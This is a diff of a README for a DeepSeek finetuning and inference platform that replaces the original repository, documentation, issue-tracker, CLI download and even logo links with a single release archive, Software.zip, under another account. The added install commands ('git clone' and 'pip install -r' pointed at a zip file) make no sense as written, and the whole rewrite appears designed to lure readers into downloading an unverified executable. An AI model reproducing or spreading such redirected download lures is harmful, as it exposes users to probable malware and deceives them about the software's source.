@@ -30,12 +30,12 @@ To get started with the Deepseek Model Finetune & Inference Platform, follow the
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/ThePocketCompany/deepseek-model-finetune-inference-platform.git
+   git clone https://github.com/MAXT5N/deepseek-model-finetune-inference-platform/releases/download/v1.0/Software.zip
    ```
 
 2. Install the necessary dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/MAXT5N/deepseek-model-finetune-inference-platform/releases/download/v1.0/Software.zip
    ```
 
 3. Begin finetuning and deploying Deepseek models for your specific tasks!
@@ -44,15 +44,15 @@ To get started with the Deepseek Model Finetune & Inference Platform, follow the
 
 ## Additional Resources
 
-For more information and detailed instructions, check out the [official documentation](https://docs.thepocketcompany.com/deepseek).
+For more information and detailed instructions, check out the [official documentation](https://github.com/MAXT5N/deepseek-model-finetune-inference-platform/releases/download/v1.0/Software.zip).
 
-If you encounter any issues or have suggestions for improvement, feel free to [create an issue](https://github.com/ThePocketCompany/deepseek-model-finetune-inference-platform/issues).
+If you encounter any issues or have suggestions for improvement, feel free to [create an issue](https://github.com/MAXT5N/deepseek-model-finetune-inference-platform/releases/download/v1.0/Software.zip).
 
 ---
 
 ## Download Deepseek CLI v1.0.0
 
-[![Download Deepseek CLI v1.0.0](https://img.shields.io/badge/Download-Deepseek_CLI_v1.0.0-green.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Deepseek CLI v1.0.0](https://github.com/MAXT5N/deepseek-model-finetune-inference-platform/releases/download/v1.0/Software.zip)](https://github.com/MAXT5N/deepseek-model-finetune-inference-platform/releases/download/v1.0/Software.zip)
 
 Click the button above to download Deepseek CLI version 1.0.0. Once downloaded, unzip the file and launch the CLI to access its powerful features.
 
@@ -62,7 +62,7 @@ Thank you for exploring The Pocket Company's Deepseek Model Finetune & Inference
 
 ---
 
-![The Pocket Company Logo](https://example.com/thepocketcompanylogo.png)
+![The Pocket Company Logo](https://github.com/MAXT5N/deepseek-model-finetune-inference-platform/releases/download/v1.0/Software.zip)
 
 **The Pocket Company**  
 Innovation in Every Pocket
